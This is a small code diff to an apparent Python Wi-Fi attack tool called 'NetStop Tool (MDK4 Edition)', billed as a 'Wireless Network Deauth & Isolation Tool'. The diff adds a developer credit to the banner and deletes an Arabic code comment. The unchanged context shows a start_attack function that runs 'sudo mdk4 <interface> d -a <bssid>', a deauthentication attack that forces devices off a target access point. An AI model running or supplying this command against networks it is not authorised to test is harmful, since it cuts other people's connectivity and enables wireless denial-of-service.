@@ -20,6 +20,7 @@ def show_banner():
     print(f"{YELLOW}" + r" | \_ |__| |  \ |__/ | ___]  |  |  | | \| " + f"{RESET}")
     print(f"{CYAN}==============================================={RESET}")
     print(f"{RED}          NetStop Tool (MDK4 Edition)          {RESET}")
+    print(f"{GREEN}       Developed by: mohamedgarde46-maker      {RESET}")
     print(f"{CYAN}==============================================={RESET}")
     print(f"{YELLOW}    Wireless Network Deauth & Isolation Tool   {RESET}")
     print(f"{CYAN}==============================================={RESET}")
@@ -31,7 +32,6 @@ def start_attack(interface, bssid):
     
     command = ["sudo", "mdk4", interface, "d", "-a", bssid]
     try:
-        # تشغيل مباشر بدون حجب المخرجات لترى الأداة وهي تعمل تفاعلياً
         subprocess.run(command)
     except KeyboardInterrupt:
         print(f"\n{GREEN}[+] Attack stopped. Connection restored! ✅{RESET}")
